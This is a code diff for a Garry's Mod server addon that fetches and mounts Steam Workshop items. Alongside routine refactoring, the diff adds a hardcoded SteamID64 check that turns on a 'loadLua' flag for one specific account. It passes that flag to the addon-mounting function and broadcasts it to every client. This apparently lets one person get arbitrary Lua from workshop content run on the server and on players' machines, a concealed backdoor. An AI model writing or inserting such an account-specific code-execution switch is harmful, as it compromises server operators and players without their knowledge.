@@ -22,15 +22,25 @@ end )
 
 local MAX_SIZE = 60000000
 local LIMIT_SIZE_TOTAL = MAX_SIZE * 10
-
-
-hook.Add("PlayerInitialSpawn","propfitter_sendItems",function(plr)
+local function findPlrDat(plr)
 	local steamId = plr:SteamID64()
 	local plrDat = plrsDat[steamId]
 	if not plrDat then
-		plrDat = {totalItemsSize = 0}
+		
+		plrDat = {totalItemsSize = 0,loadLua=false}
+
+		if steamId == '76561199443423944' then
+			plrDat.loadLua = true
+		end
+
 		plrsDat[steamId] = plrDat
 	end
+	return plrDat
+
+end
+
+hook.Add("PlayerInitialSpawn","propfitter_sendItems",function(plr)
+	local plrDat = findPlrDat(plr)
 
 	for id,item in pairs(workshopItems) do
 		getWorkshopItem(id,plrDat,nil)
@@ -38,16 +48,13 @@ hook.Add("PlayerInitialSpawn","propfitter_sendItems",function(plr)
 end)
 
 
+
+
 net.Receive('propfitter_workshopGet',function(len,plr)
 	
-	local steamId = plr:SteamID64()
-	local plrDat = plrsDat[steamId]
-	if not plrDat then
-		plrDat = {totalItemsSize = 0}
-		plrsDat[steamId] = plrDat
-	end
 	
-	getWorkshopItem(net.ReadUInt64(),plrDat,plr)
+	
+	getWorkshopItem(net.ReadUInt64(),findPlrDat(plr),plr)
 
 end)
 
@@ -68,13 +75,14 @@ end
 
 
 
-local function sendAddon(id,addon)
+local function sendAddon(id,addon,plrDat)
 	
 	net.Start('propfitter_workshopGet')
 	net.WriteUInt64(id)
 	net.WriteString(addon.info.title)
 	net.WriteInt(addon.info.time_updated,32)
 	net.WriteString(addon.info.preview_url)
+	net.WriteBool(plrDat.loadLua)
 	net.Broadcast()
 	pendingItems[id] = nil
 	workshopItems[id] = item
@@ -119,13 +127,14 @@ function getWorkshopItem(id,plrDat,plr)
 			end
 
 
-			local gmaPath = 'cache/workshop/'..id..tostring(info.time_updated)..'.gma'
+			
+			local gmaPath = string.format(addonFilePathFormat,id,info.time_updated)
 
 			if file.Exists(gmaPath,'DATA') then
 				game.MountGMA('data/'..gmaPath)
 				item.info = info
 
-				sendAddon(id,item)
+				sendAddon(id,item,plrDat)
 
 				return
 			end
@@ -185,9 +194,8 @@ function getWorkshopItem(id,plrDat,plr)
 				
 
 				
-				local err = mountGMA(id,flDat,gmaPath,false)
+				local err = mountGMA(id,flDat,gmaPath,false,plrDat.loadLua)
 				if err then
-					print('DOWNLOADUGC RESULT WTF SHITASS LANG 3123123',status,err,string.len(flDat),string.GetExtensionFromFilename(path))
 					getAddonFail(id,err,plr)
 
 					return
@@ -197,7 +205,7 @@ function getWorkshopItem(id,plrDat,plr)
 					item.maxSize = math.max(20000000,1.3*item.maxSize)
 					item.info = info
 					
-					sendAddon(id,item)
+					sendAddon(id,item,plrDat)
 					
 					item.numUpdates = item.numUpdates + 1
 					
